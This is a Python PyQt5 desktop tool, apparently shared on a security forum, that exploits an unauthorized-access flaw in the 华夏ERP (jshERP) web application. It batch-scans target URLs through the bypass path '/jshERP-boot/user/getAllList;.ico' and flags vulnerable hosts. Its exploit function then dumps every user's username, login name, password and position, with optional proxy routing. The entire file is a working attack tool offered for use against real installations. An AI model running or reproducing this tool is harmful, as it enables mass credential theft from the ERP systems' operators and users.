import sys
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, QTextEdit, QPushButton, QFileDialog, QDialog, QFormLayout
from PyQt5.QtCore import Qt
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import json


class ProxySettingsDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("设置代理")
        self.setFixedSize(300, 150)

        self.layout = QFormLayout()

        self.ip_input = QLineEdit()
        self.port_input = QLineEdit()

        self.layout.addRow("IP:", self.ip_input)
        self.layout.addRow("端口:", self.port_input)

        self.save_button = QPushButton("保存")
        self.save_button.clicked.connect(self.save_proxy_settings)
        self.layout.addWidget(self.save_button)

        self.setLayout(self.layout)

    def save_proxy_settings(self):
        ip = self.ip_input.text().strip()
        port = self.port_input.text().strip()

        if ip and port:
            proxy_settings = {
                'http': f'http://{ip}:{port}',
                'https': f'http://{ip}:{port}'
            }
            MainWindow.set_proxy_settings(proxy_settings)

        self.close()


class MainWindow(QWidget):
    proxy_settings = {}

    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.resize(800, 600)  # Set initial window size
        self.setStyleSheet("background-color: #F0F0F0;")  # Set window background color

        self.layout = QVBoxLayout()

        # URL input
        url_layout = QHBoxLayout()
        self.url_label = QLabel("URL:")
        url_layout.addWidget(self.url_label)
        self.url_input = QLineEdit()
        self.url_input.setStyleSheet("padding: 5px; font-size: 14px;")  # Set text box style
        url_layout.addWidget(self.url_input)
        self.layout.addLayout(url_layout)

        # Button layout
        button_layout = QVBoxLayout()
        button_layout.setAlignment(Qt.AlignTop | Qt.AlignRight)  # Align buttons with the top and right of the layout

        # File selection button
        self.file_button = QPushButton("选择文件")
        self.file_button.setFixedSize(100, 30)  # Set button size
        self.file_button.setStyleSheet("background-color: #0099CC; color: white; border: none;")  # Set button style
        self.file_button.clicked.connect(self.select_file)
        button_layout.addWidget(self.file_button)

        # Fetch button
        self.fetch_button = QPushButton("验证")
        self.fetch_button.setFixedSize(100, 30)  # Set button size
        self.fetch_button.setStyleSheet("background-color: #0099CC; color: white; border: none;")  # Set button style
        self.fetch_button.clicked.connect(self.fetch_user_list)
        button_layout.addWidget(self.fetch_button)

        # Exp button
        self.exp_button = QPushButton("利用")
        self.exp_button.setFixedSize(100, 30)  # Set button size
        self.exp_button.setStyleSheet("background-color: #0099CC; color: white; border: none;")  # Set button style
        self.exp_button.clicked.connect(self.run_exp)
        button_layout.addWidget(self.exp_button)

        # Proxy settings button
        self.proxy_button = QPushButton("设置代理")
        self.proxy_button.setFixedSize(100, 30)  # Set button size
        self.proxy_button.setStyleSheet("background-color: #0099CC; color: white; border: none;")  # Set button style
        self.proxy_button.clicked.connect(self.show_proxy_settings)
        button_layout.addWidget(self.proxy_button)

        self.layout.addLayout(button_layout)

        # Result text box
        self.result_textbox = QTextEdit()
        self.result_textbox.setStyleSheet("padding: 5px; font-size: 14px;")  # Set text box style
        self.layout.addWidget(self.result_textbox)

        self.setWindowTitle("华夏ERP-API未授权访问漏洞-T00ls by 秋叶333333")
        self.setLayout(self.layout)
        self.show()

    def select_file(self):
        file_dialog = QFileDialog()
        file_dialog.setFileMode(QFileDialog.ExistingFile)
        file_dialog.setNameFilter("Text files (*.txt)")
        if file_dialog.exec_():
            selected_files = file_dialog.selectedFiles()
            if selected_files:
                file_path = selected_files[0]
                self.process_file(file_path)

    def process_file(self, file_path):
        with open(file_path, "r") as file:
            urls = file.readlines()
            urls = [url.strip() for url in urls]
            self.url_input.setText("\n".join(urls))

    def fetch_user_list(self):
        urls_input = self.url_input.text().strip()
        urls = urls_input.split("\n")
        result = ""

        for url in urls:
            url = url.strip()

            if not url.startswith("http"):
                url = f"http://{url}"

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "Upgrade-Insecure-Requests": "1"
            }

            try:
                # 设置验证路径为/jshERP-boot/user/getAllList;.ico
                verify_url = url + "/jshERP-boot/user/getAllList;.ico"
                response = requests.get(verify_url, headers=headers, proxies=self.proxy_settings, verify=False, timeout=5)
                if response.status_code == 200:
                    if "userList" in response.text and "username" in response.text and "password" in response.text:
                        result += f"{url} 存在漏洞\n"
                    else:
                        result += f"{url} 不存在漏洞\n"
                else:
                    result += f"{url} 请求失败\n"
            except requests.RequestException:
                result += f"{url} 请求失败\n"

        self.result_textbox.setText(result)

    def run_exp(self):
        domain = self.url_input.text().strip()
        url = f"{domain}/jshERP-boot/user/getAllList;.ico"

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Upgrade-Insecure-Requests': '1'
        }

        res = requests.get(url, headers=headers, proxies=self.proxy_settings)
        response_data = json.loads(res.text)

        if 'data' in response_data and 'userList' in response_data['data']:
            user_list = response_data['data']['userList']

            result = ""
            for user in user_list:
                username = user['username']
                login_name = user['loginName']
                password = user['password']
                position = user['position']

                result += f"Username: {username}\n" \
                          f"Login Name: {login_name}\n" \
                          f"Password: {password}\n" \
                          f"Position: {position}\n" \
                          f"───────────\n"

            self.result_textbox.setText(result)
        else:
            self.result_textbox.setText("No user list found.")

    def show_proxy_settings(self):
        proxy_dialog = ProxySettingsDialog(self)
        proxy_dialog.exec_()

    @classmethod
    def set_proxy_settings(cls, proxy_settings):
        cls.proxy_settings = proxy_settings


if __name__ == '__main__':
    app = QApplication(sys.argv)
    main_window = MainWindow()
    sys.exit(app.exec_())
